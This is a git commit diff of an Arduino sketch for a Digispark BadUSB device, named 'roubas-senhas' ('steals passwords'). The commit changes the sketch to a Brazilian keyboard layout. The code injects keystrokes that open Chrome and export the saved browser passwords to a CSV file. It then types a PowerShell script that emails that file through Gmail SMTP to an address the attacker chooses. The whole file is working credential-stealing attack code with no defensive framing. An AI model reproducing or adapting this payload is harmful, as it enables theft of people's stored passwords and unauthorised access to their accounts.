272041c508fce6fb6a737b2102603c3c46d0873a
CyberDenner <146398551+CyberDenner@users.noreply.github.com>
2023-11-07 14:58:30 -0300

    roubas-senhas.ino

--- Senhas_Navegador/roubas-senhas.ino
+++ Senhas_Navegador/roubas-senhas.ino
@@ -1,69 +1,71 @@
-#include "DigiKeyboard.h"
+#include "DigiKeyboardPtBr.h"
 void setup() {
 }
 
 void loop() {
-  DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(500);
-  // Abrindo o google
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("chrome");
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  // Indo até as senhas
-  DigiKeyboard.print("chrome://settings/passwords");
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("\t\t\t\t\t\t\t");
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("senhas.csv");
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("\t\t\t");
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  // Salvando as senhas
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("powershell");
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  //from email address:
-  DigiKeyboard.print(F("$email = \"EMAIL\";"));
-  //to email address
-  DigiKeyboard.print(F("$addressee = \" SEU EMAIL\";"));
-  // o lugar onde vai salvar as senhas
-  DigiKeyboard.print(F("$tempcsv = \"D:\\Pessoal\\Documents\\senhas.csv\";"));
-  // senha da sua conta
-  DigiKeyboard.print(F("$pass = \"SENHA\";"));
-  DigiKeyboard.print(F("$smtpServer = \"smtp.gmail.com\";"));
-  DigiKeyboard.print(F("$port = \"587\";"));
+   // Abrindo o google chrome
+  DigiKeyboardPtBr.sendKeyStroke(0);
+  DigiKeyboardPtBr.delay(500);
 
-  DigiKeyboard.print(F("$securestring = $pass | ConvertTo-SecureString -AsPlainText -Force;"));
-  DigiKeyboard.print(F("$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $email, $securestring;"));
-  DigiKeyboard.print(F("$msg = new-object Net.Mail.MailMessage;"));
-  DigiKeyboard.print(F("$smtp = new-object Net.Mail.SmtpClient($smtpServer, $port);"));
-  DigiKeyboard.print(F("$smtp.EnableSsl = $true;"));
-  DigiKeyboard.print(F("$msg.From = \"$email\";"));
-  DigiKeyboard.print(F("$msg.To.Add(\"$addressee\");"));
-  DigiKeyboard.print(F("$msg.Attachments.Add(\"$tempcsv\");"));
-  DigiKeyboard.print(F("$msg.BodyEncoding = [system.Text.Encoding]::Unicode;"));
-  DigiKeyboard.print(F("$msg.SubjectEncoding = [system.Text.Encoding]::Unicode;"));
-  DigiKeyboard.print(F("$msg.IsBodyHTML = $true ;"));
-  DigiKeyboard.print(F("$msg.Subject = \"Senhas do Navegador\";"));
-  DigiKeyboard.print(F("$msg.Body = \"<h2> Aqui as suas senhas </h2></br>olha o arquivo...\"; "));
-  DigiKeyboard.print(F("$SMTP.Credentials = $cred;"));
-  DigiKeyboard.print(F("$smtp.Send($msg);"));
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.println("chrome");
+  DigiKeyboardPtBr.delay(1000);
+  
+  // Indo até as senhas
+  DigiKeyboardPtBr.print("chrome://settings/passwords");
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.print("\t\t\t\t\t\t\t");
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.print("senhas.csv");
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.print("\t\t\t");
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
+  
+  // Salvando as senhas
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.print("powershell");
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardPtBr.delay(500);
+  
+  //from email address:
+  DigiKeyboardPtBr.print(F("$email = \"EMAIL\";"));
+  //to email address
+  DigiKeyboardPtBr.print(F("$addressee = \" SEU EMAIL\";"));
+  // o lugar onde vai salvar as senhas
+  DigiKeyboardPtBr.print(F("$tempcsv = \"D:\\Pessoal\\Documents\\senhas.csv\";"));
+  // senha da sua conta
+  DigiKeyboardPtBr.print(F("$pass = \"SENHA\";"));
+  DigiKeyboardPtBr.print(F("$smtpServer = \"smtp.gmail.com\";"));
+  DigiKeyboardPtBr.print(F("$port = \"587\";"));
+  
+  DigiKeyboardPtBr.print(F("$securestring = $pass | ConvertTo-SecureString -AsPlainText -Force;"));
+  DigiKeyboardPtBr.print(F("$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $email, $securestring;"));
+  DigiKeyboardPtBr.print(F("$msg = new-object Net.Mail.MailMessage;"));
+  DigiKeyboardPtBr.print(F("$smtp = new-object Net.Mail.SmtpClient($smtpServer, $port);"));
+  DigiKeyboardPtBr.print(F("$smtp.EnableSsl = $true;"));
+  DigiKeyboardPtBr.print(F("$msg.From = \"$email\";"));
+  DigiKeyboardPtBr.print(F("$msg.To.Add(\"$addressee\");"));
+  DigiKeyboardPtBr.print(F("$msg.Attachments.Add(\"$tempcsv\");"));
+  DigiKeyboardPtBr.print(F("$msg.BodyEncoding = [system.Text.Encoding]::Unicode;"));
+  DigiKeyboardPtBr.print(F("$msg.SubjectEncoding = [system.Text.Encoding]::Unicode;"));
+  DigiKeyboardPtBr.print(F("$msg.IsBodyHTML = $true ;"));
+  DigiKeyboardPtBr.print(F("$msg.Subject = \"Senhas do Navegador\";"));
+  DigiKeyboardPtBr.print(F("$msg.Body = \"<h2> Aqui as suas senhas </h2></br>olha o arquivo...\"; "));
+  DigiKeyboardPtBr.print(F("$SMTP.Credentials = $cred;"));
+  DigiKeyboardPtBr.print(F("$smtp.Send($msg);"));
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
 }
